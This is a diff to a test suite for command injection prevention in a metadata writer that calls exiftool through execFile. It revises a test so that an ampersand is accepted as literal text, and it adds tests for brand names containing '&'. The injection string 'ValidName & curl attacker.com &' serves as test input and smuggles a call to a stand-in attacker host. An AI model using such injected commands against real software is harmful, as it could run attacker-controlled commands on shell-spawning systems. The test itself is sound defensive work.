@@ -91,12 +91,21 @@ describe('Command Injection Prevention', () => {
     ).rejects.toThrow();
   });
 
-  it('should reject metadata with ampersand background execution', async () => {
-    const maliciousName = 'ValidName & curl attacker.com &';
+  it('should allow ampersand but prevent command execution via execFile', async () => {
+    if (!exiftoolAvailable) {
+      console.log('⏭️  Skipping - exiftool not available');
+      return;
+    }
 
+    // This test documents that execFile() prevents command execution
+    // even when & is present in the input (no shell spawned)
+    const nameWithAmpersand = 'ValidName & curl attacker.com &';
+
+    // Should NOT throw - execFile prevents actual command execution
+    // The & character is written as literal metadata, not executed
     await expect(
-      writer.writeMetadataToFile(testFile, maliciousName, [])
-    ).rejects.toThrow();
+      writer.writeMetadataToFile(testFile, nameWithAmpersand, [])
+    ).resolves.not.toThrow();
   });
 
   it('should accept safe metadata with special but safe characters', async () => {
@@ -125,6 +134,26 @@ describe('Command Injection Prevention', () => {
     // Should handle Unicode without shell injection
     await expect(
       writer.writeMetadataToFile(testFile, unicodeName, [])
+    ).resolves.not.toThrow();
+  });
+
+  it('should ALLOW ampersand in legitimate brand names (safe with execFile)', async () => {
+    if (!exiftoolAvailable) {
+      console.log('⏭️  Skipping - exiftool not available');
+      return;
+    }
+
+    // These are legitimate brand/product names that should be allowed
+    // Ampersand is safe with execFile() because:
+    // 1. No shell is spawned (execFile, NOT exec)
+    // 2. Arguments passed as array (no shell expansion)
+    // 3. & has no special meaning without shell interpreter
+    const legitimateBrandName = "Villeroy & Boch - Kitchen Range";
+    const legitimateTags = ['5 Kg Wash & Dry', 'Wash & Wear', 'Salt & Pepper'];
+
+    // Should NOT throw - ampersand is safe with execFile (no shell)
+    await expect(
+      writer.writeMetadataToFile(testFile, legitimateBrandName, legitimateTags)
     ).resolves.not.toThrow();
   });
 });
